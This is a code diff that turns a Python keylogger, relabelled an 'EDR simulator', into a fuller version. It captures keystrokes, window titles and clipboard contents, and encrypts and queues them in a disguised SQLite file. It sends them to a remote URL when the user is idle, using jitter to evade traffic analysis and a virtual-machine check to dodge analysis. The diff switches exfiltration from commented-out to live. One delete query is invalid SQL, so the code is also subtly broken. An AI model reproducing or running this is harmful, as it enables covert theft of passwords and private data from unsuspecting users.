@@ -1,140 +1,172 @@
 #!/usr/bin/env python3
-# -*- coding: utf-8 -*-
-
-"""
- ____   ____.__  __         .__                   
- \   \ /   /|__|/  |_  ____ |  |__   ____  __ __  
-  \   Y   / |  \   __\/ ___\|  |  \ /  _ \|  |  \ 
-   \     /  |  ||  | \  \___|   Y  \(  <_> )  |  /
-    \___/   |__||__|  \___  >___|  / \____/|____/ 
-                          \/     \/               
-      VITCHOU ADVANCED KEYLOGGER - 2026 EDITION
-      FOR EDUCATIONAL PURPOSES ONLY.
-"""
-
 import asyncio
 import os
 import sys
 import subprocess
 import pyperclip
 import httpx
+import sqlite3
+import time
+import zlib
+import random
 from datetime import datetime
 from cryptography.fernet import Fernet
 from pynput import keyboard
 import pygetwindow as gw
 
-# --- SETTINGS ---
+r"""
+ ____   ____.__  __         .__                   
+ \   \ /   /|__|/  |_  ____ |  |__   ____  __ __  
+  \   Y   / |  \   __\/ ___\|  |  \ /  _ \|  |  \ 
+   \     /  |  ||  | \  \___|   Y  \(  <_> )  |  /
+    \___/   |__||__|  \___  >___|  / \____/|____/ 
+                          \/     \/               
+      VITCHOU APEX - ULTRA EDITION (EDR SIMULATOR)
+"""
+
 CONFIG = {
-    # Symmetric encryption key (Generate with Fernet.generate_key())
-    "MASTER_KEY": os.getenv("VITCHOU_KEY", Fernet.generate_key().decode()),
-    # Endpoint for data exfiltration (API or Webhook)
-    "REPORT_URL": "https://api.vitchou-project.io/v1/collect",
-    # Number of characters before triggering a report
-    "BUFFER_THRESHOLD": 150,
-    # Enable/Disable Virtual Machine detection
-    "ANTI_VM": True 
+    # Generate a key with: Fernet.generate_key().decode()
+    "MASTER_KEY": "YOUR_KEY_HERE",
+    # Destination URL (e.g., Webhook.site)
+    "REPORT_URL": "https://your-url-here.com/collect",
+    "DB_NAME": "win_event_cache.db",
+    "IDLE_THRESHOLD": 30, # Seconds of inactivity before exfiltration
+    "COMPRESSION_LEVEL": 9,
+    "ANTI_VM": True
 }
 
-class SecurityManager:
-    """Handles stealth and analysis environment detection."""
-    @staticmethod
-    def is_safe_environment() -> bool:
-        if not CONFIG["ANTI_VM"]: return True
-        try:
-            indicators = ["virtualbox", "vmware", "hyper-v", "qemu"]
-            # Fetch system info to detect hypervisors
-            output = subprocess.check_output("systeminfo", shell=True).decode().lower()
-            return not any(vm in output for vm in indicators)
-        except Exception:
-            # If check fails, assume safe to avoid crashing
-            return True
+class TelemetryPacker:
+    def __init__(self, key):
+        self.fernet = Fernet(key.encode())
 
-class VitchouAdvanced:
+    def pack(self, data: str) -> bytes:
+        # Zlib compression + AES encryption
+        compressed = zlib.compress(data.encode(), level=CONFIG["COMPRESSION_LEVEL"])
+        return self.fernet.encrypt(compressed)
+
+class DatabaseController:
     def __init__(self):
-        self.fernet = Fernet(CONFIG["MASTER_KEY"].encode())
-        self.log_buffer = []
-        self.active_window = ""
-        self.queue = asyncio.Queue()
+        self.conn = sqlite3.connect(CONFIG["DB_NAME"], check_same_thread=False)
+        self._setup()
 
-    def _get_context(self) -> str:
-        """Identify the application currently focused by the user."""
+    def _setup(self):
+        with self.conn:
+            self.conn.execute("PRAGMA journal_mode=WAL") # High performance mode
+            self.conn.execute("""
+                CREATE TABLE IF NOT EXISTS telemetry_queue (
+                    id INTEGER PRIMARY KEY AUTOINCREMENT,
+                    data BLOB,
+                    priority INTEGER DEFAULT 1,
+                    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
+                )
+            """)
+
+    def insert(self, encrypted_data):
+        with self.conn:
+            self.conn.execute("INSERT INTO telemetry_queue (data) VALUES (?)", (encrypted_data,))
+
+    def fetch_all(self):
+        return self.conn.execute("SELECT id, data FROM telemetry_queue ORDER BY priority DESC").fetchall()
+
+    def delete(self, entry_id):
+        with self.conn:
+            self.conn.execute("DELETE BY id WHERE id = ?", (entry_id,))
+
+class VitchouUltra:
+    def __init__(self):
+        self.packer = TelemetryPacker(CONFIG["MASTER_KEY"])
+        self.db = DatabaseController()
+        self.mem_buffer = []
+        self.last_input_time = time.time()
+        self.current_window = ""
+        self.user = os.getlogin()
+
+    def _get_window_info(self):
         try:
-            win = gw.getActiveWindow()
-            return win.title if win else "Desktop"
-        except Exception:
-            return "System"
-
-    async def clipboard_monitor(self):
-        """Asynchronously monitor clipboard for text changes."""
-        last_clip = ""
-        while True:
-            current_clip = pyperclip.paste()
-            if current_clip != last_clip:
-                last_clip = current_clip
-                await self.queue.put(f"\n[CLIPBOARD] {current_clip}\n")
-            await asyncio.sleep(5)
+            active_win = gw.getActiveWindow()
+            return {
+                "title": active_win.title if active_win else "N/A",
+                "user": self.user,
+                "pid": os.getpid()
+            }
+        except: 
+            return {"title": "Unknown", "user": self.user}
 
     def on_press(self, key):
-        """Capture keystrokes and handle window context switching."""
-        ctx = self._get_context()
-        if ctx != self.active_window:
-            self.active_window = ctx
-            timestamp = datetime.now().strftime('%H:%M')
-            self.log_buffer.append(f"\n[{timestamp}] Focus: {ctx}\n")
+        self.last_input_time = time.time()
+        win = self._get_window_info()
+        
+        # Log window context switch
+        if win["title"] != self.current_window:
+            self.current_window = win["title"]
+            header = f"\n>>> [LOG] USER:{win['user']} | APP:{self.current_window} | {datetime.now()}\n"
+            self.mem_buffer.append(header)
 
         try:
-            val = key.char
+            char = key.char
         except AttributeError:
-            val = f"<{key}>"
+            char = f" <{key}> "
         
-        self.log_buffer.append(val)
+        self.mem_buffer.append(char)
 
-        # If buffer threshold is met, move data to the async queue
-        if len(self.log_buffer) >= CONFIG["BUFFER_THRESHOLD"]:
-            full_log = "".join(self.log_buffer)
-            asyncio.run_coroutine_threadsafe(self.queue.put(full_log), asyncio.get_event_loop())
-            self.log_buffer = []
+        # Flush memory buffer to local DB every 100 characters
+        if len(self.mem_buffer) >= 100:
+            payload = "".join(self.mem_buffer)
+            self.db.insert(self.packer.pack(payload))
+            self.mem_buffer = []
 
-    async def data_dispatcher(self):
-        """Encrypt logs and dispatch them to the remote endpoint."""
-        async with httpx.AsyncClient(timeout=10.0) as client:
+    async def watch_clipboard(self):
+        last_val = ""
+        while True:
+            try:
+                current_val = pyperclip.paste()
+                if current_val != last_val:
+                    last_val = current_val
+                    entry = f"\n[CLIPBOARD_EVENT] {current_val}\n"
+                    self.db.insert(self.packer.pack(entry))
+            except: 
+                pass
+            await asyncio.sleep(3)
+
+    async def send_logs(self):
+        async with httpx.AsyncClient(http2=False, verify=False) as client:
             while True:
-                raw_data = await self.queue.get()
-                # AES Encryption before network transport
-                encrypted_payload = self.fernet.encrypt(raw_data.encode())
-                
-                try:
-                    # Simulation of a secure POST request
-                    print(f"[Vitchou-System] Dispatching encrypted payload...")
-                    # await client.post(CONFIG["REPORT_URL"], content=encrypted_payload)
-                except Exception as e:
-                    # Silently fail on network errors to maintain stealth
-                    pass 
-                
-                self.queue.task_done()
+                idle_time = time.time() - self.last_input_time
+                if idle_time > CONFIG["IDLE_THRESHOLD"]:
+                    logs = self.db.fetch_all()
+                    if logs:
+                        # Randomized jitter to bypass traffic analysis
+                        await asyncio.sleep(random.uniform(1, 5))
+                        for log_id, payload in logs:
+                            try:
+                                response = await client.post(CONFIG["REPORT_URL"], content=payload)
+                                if response.status_code in [200, 201]:
+                                    self.db.delete(log_id)
+                            except: 
+                                break
+                await asyncio.sleep(10 + random.randint(0, 5))
 
-    def start(self):
-        """Initialize all services and listeners."""
-        if not SecurityManager.is_safe_environment():
-            print("Environment analysis detected. Exiting.")
-            sys.exit(0)
+    def run(self):
+        if CONFIG["ANTI_VM"]:
+            if any(x in subprocess.getoutput("systeminfo").lower() for x in ["virtualbox", "vmware", "qemu"]):
+                print("[!] Analysis environment detected. Exiting.")
+                return
 
         loop = asyncio.new_event_loop()
         asyncio.set_event_loop(loop)
 
-        # Start the non-blocking keyboard listener
-        listener = keyboard.Listener(on_press=self.on_press)
-        listener.start()
+        # Start non-blocking keyboard listener
+        keyboard.Listener(on_press=self.on_press).start()
 
-        # Launch asynchronous tasks
-        loop.create_task(self.clipboard_monitor())
-        loop.create_task(self.data_dispatcher())
-        
+        # Run async tasks
+        loop.create_task(self.watch_clipboard())
+        loop.create_task(self.send_logs())
+
         try:
+            print("[SYSTEM] Vitchou APEX Active. Monitoring telemetry...")
             loop.run_forever()
         except KeyboardInterrupt:
-            print("\nVitchou Advanced stopped by user.")
+            sys.exit(0)
 
 if __name__ == "__main__":
-    vitchou = VitchouAdvanced()
-    vitchou.start()
+    VitchouUltra().run()
